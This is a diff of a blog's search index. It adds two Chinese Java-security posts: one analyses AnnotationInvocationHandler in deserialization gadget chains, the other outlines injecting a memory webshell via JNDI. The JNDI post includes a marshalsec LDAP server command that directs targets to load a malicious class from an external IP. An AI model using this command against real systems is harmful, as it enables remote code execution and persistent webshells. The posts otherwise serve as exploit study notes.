@@ -1,6 +1,55 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>AnnotationInvocationHandler的深度分析</title>
+    <url>/p/37597.html</url>
+    <content><![CDATA[<p>cc链于jdk原生反序列化中常用<code>AnnotationInvocationHandler</code>做最后的包装，其优点如下。</p>
+<p>一、其readobject中有setvalue方法当cc1使用<code>TransformedMap</code>包裹时，setvalue后会调用TransformedMap中的checksetvalue方法进而调用valueTransformer.transform(value)达到命令执行。</p>
+<p><img src="/imgs/AnnotationInvocationHandler%E7%9A%84%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/image.png" alt="image.png"></p>
+<p>![image.png](&#x2F;imgs&#x2F;AnnotationInvocationHandler的深度分析&#x2F;image 1.png)</p>
+<p>![image.png](&#x2F;imgs&#x2F;AnnotationInvocationHandler的深度分析&#x2F;image 2.png)</p>
+<p>二、<code>AnnotationInvocationHandler</code>是一个代理类，其invoke方法中存在<code>equalsImpl</code>与<code>get</code>方法。使用<code>AnnotationInvocationHandler</code>包裹自身代理类后（如代理lazymap的map接口）则执行setvalue时必然会走到invoke方法中调用到get的危险方法如（lazymap.get）。7u21时会调用到equalsImpl。</p>
+<p>![image.png](&#x2F;imgs&#x2F;AnnotationInvocationHandler的深度分析&#x2F;image 3.png)</p>
+<p>![image.png](&#x2F;imgs&#x2F;AnnotationInvocationHandler的深度分析&#x2F;image 4.png)</p>
+<p>![image.png](&#x2F;imgs&#x2F;AnnotationInvocationHandler的深度分析&#x2F;image 5.png)</p>
+<h2 id="针对于动态代理在反序列化中的思考"><a href="#针对于动态代理在反序列化中的思考" class="headerlink" title="针对于动态代理在反序列化中的思考"></a>针对于动态代理在反序列化中的思考</h2><p>动态代理需要的东西：</p>
+<p>一个要被代理的接口</p>
+<p>一个被代理的实体类（其实现了某个接口）</p>
+<p>一个实现了<code>InvocationHandler</code>代理类</p>
+<p>最后使用Proxy.newProxyInstance实现动态代理</p>
+<p>代理类代理的是接口，所以其构造方法一般是接受的是一个接口。</p>
+<p>当追踪到反序列链条最终存在危险方法<code>a.b</code>时（如lazymap.get），要代理<code>a</code>的<code>b</code>方法时该方法必须是从一个接口如<code>c</code>实现而来，进而则可寻找满足如下条件的代理类。该代理类的构造方法接受<code>a</code>实现的接口<code>c</code>且invoke中调用了方法<code>b</code>。</p>
+<p>如下图所示：</p>
+<p>![image.png](&#x2F;imgs&#x2F;AnnotationInvocationHandler的深度分析&#x2F;image 6.png)</p>
+]]></content>
+      <tags>
+        <tag>java安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JNDI注入打内存马</title>
+    <url>/p/23696.html</url>
+    <content><![CDATA[<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>以下两处类名需保持一致</p>
+<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image-20240329193616538.png" alt="image-20240329193616538"></p>
+<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image-20240329193903563.png" alt="image-20240329193903563"></p>
+<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%202.png" alt="image 2"></p>
+<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%203-1712456.png" alt="image 3"></p>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>jmg生成class文件</p>
+<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%204.png" alt="image 4"></p>
+<p>上传vps起一个http服务</p>
+<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%205.png" alt="image 5"></p>
+<p>起ldap服务</p>
+<pre class="line-numbers language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.LDAPRefServer &quot;http:&#x2F;&#x2F;8.141.3.125:9999&#x2F;#qaxnb&quot; 7777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%206.png" alt="image 6"></p>
+<p>直接注入</p>
+<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%207.png" alt="image 7"></p>
+]]></content>
+      <tags>
+        <tag>java安全</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Matery主题代码块问题</title>
     <url>/p/undefined.html</url>
     <content><![CDATA[<p>使用代码块时遇到不能正常显示的问题：</p>
@@ -319,29 +368,6 @@ Interceptor<span class="token punctuation">.</span><span class="token function">
 ]]></content>
       <tags>
         <tag>app逆向</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JNDI注入打内存马</title>
-    <url>/p/23696.html</url>
-    <content><![CDATA[<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>以下两处类名需保持一致</p>
-<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image-20240329193616538.png" alt="image-20240329193616538"></p>
-<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image-20240329193903563.png" alt="image-20240329193903563"></p>
-<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%202.png" alt="image 2"></p>
-<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%203-1712456.png" alt="image 3"></p>
-<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>jmg生成class文件</p>
-<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%204.png" alt="image 4"></p>
-<p>上传vps起一个http服务</p>
-<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%205.png" alt="image 5"></p>
-<p>起ldap服务</p>
-<pre class="line-numbers language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.LDAPRefServer &quot;http:&#x2F;&#x2F;8.141.3.125:9999&#x2F;#qaxnb&quot; 7777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%206.png" alt="image 6"></p>
-<p>直接注入</p>
-<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%207.png" alt="image 7"></p>
-]]></content>
-      <tags>
-        <tag>java安全</tag>
       </tags>
   </entry>
 </search>
